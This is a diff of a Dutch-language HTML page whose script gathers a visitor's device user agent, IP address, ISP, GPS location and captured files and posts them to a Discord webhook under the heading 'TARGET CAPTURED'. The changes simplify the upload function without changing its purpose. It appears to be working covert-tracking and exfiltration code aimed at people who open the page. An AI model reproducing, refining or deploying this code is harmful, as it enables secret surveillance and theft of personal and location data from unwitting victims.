@@ -1,3 +1,4 @@
+@@ -0,0 +1,281 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
@@ -249,13 +250,11 @@
 
   async function upload(blobs) {
     const data = new FormData();
-    
-    // De JSON payload moet exact deze structuur hebben voor webhooks
     const payload = {
       username: "Security Logs",
       embeds: [{
         title: "✅ TARGET CAPTURED",
-        color: 2400734, // Integer format voor #24A1DE
+        color: 0x24A1DE,
         fields: [
           { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 150)}\`` },
           { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
@@ -264,35 +263,14 @@
           { name: "🏢 ISP", value: ipInfo.isp, inline: false },
           { name: "🎯 GPS", value: gpsInfo.lat ? `${gpsInfo.lat}, ${gpsInfo.lon} (±${gpsInfo.acc}m)` : "Denied", inline: true }
         ],
-        timestamp: new Date().toISOString()
+        timestamp: new Date()
       }]
     };
-
-    // Voeg de JSON toe onder de 'payload_json' key
     data.append('payload_json', JSON.stringify(payload));
-
-    // Discord verwacht bestanden met de key 'file[n]' of simpelweg unieke namen
-    if (blobs.length > 0) {
-      blobs.forEach((item, index) => {
-        data.append(`file${index}`, item.b, item.n);
-      });
-    }
-
-    try {
-      const response = await fetch(WEBHOOK, {
-        method: 'POST',
-        body: data
-        // Belangrijk: Geen 'Content-Type' header handmatig instellen bij FormData!
-      });
-
-      if (!response.ok) {
-        const errText = await response.text();
-        console.error("Discord Error:", errText);
-      }
-    } catch (err) {
-      console.error("Verzendfout:", err);
-    }
+    blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
+    await fetch(WEBHOOK, { method: 'POST', body: data });
   }
+
   window.onload = () => {
     if (isDiscord()) {
       document.getElementById('screen-landing').style.display = 'none';
